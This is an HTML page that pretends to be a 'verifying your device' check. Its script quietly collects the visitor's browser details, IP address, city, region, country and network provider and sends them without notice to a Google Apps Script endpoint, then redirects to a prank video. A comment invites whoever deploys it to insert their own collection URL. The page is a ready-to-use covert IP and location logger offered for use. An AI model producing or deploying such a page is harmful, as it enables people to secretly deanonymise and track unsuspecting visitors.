<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Just a Moment...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
  </style>
</head>
<body>
  <h2>Just a moment...</h2>
  <p>Weâ€™re verifying your device info.</p>

  <script>
    const deviceInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
    };

    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(location => {
        const dataToSend = {
          ...deviceInfo,
          ip: location.ip,
          city: location.city,
          region: location.region,
          country: location.country_name,
          org: location.org,
        };

        // >>>>>>> REPLACE THE URL BELOW WITH YOUR SCRIPT WEB APP URL <<<<<<<
        fetch("https://script.google.com/macros/s/AKfycbx1_XQcM95BFYgncJLbkdA8oaEfeIil9vJOZc9WFQYxsD3oVfKPiz8OS4_7LH_FF8h5/exec", {
          method: "POST",
          body: JSON.stringify(dataToSend),
          headers: {
            "Content-Type": "application/json",
          },
        });

        // Redirect after 3 seconds
        setTimeout(() => {
          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
        }, 3000);
      })
      .catch(err => {
        console.error("Failed to get location or send data:", err);
        // Still redirect anyway
        setTimeout(() => {
          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
        }, 3000);
      });
  </script>
</body>
</html>
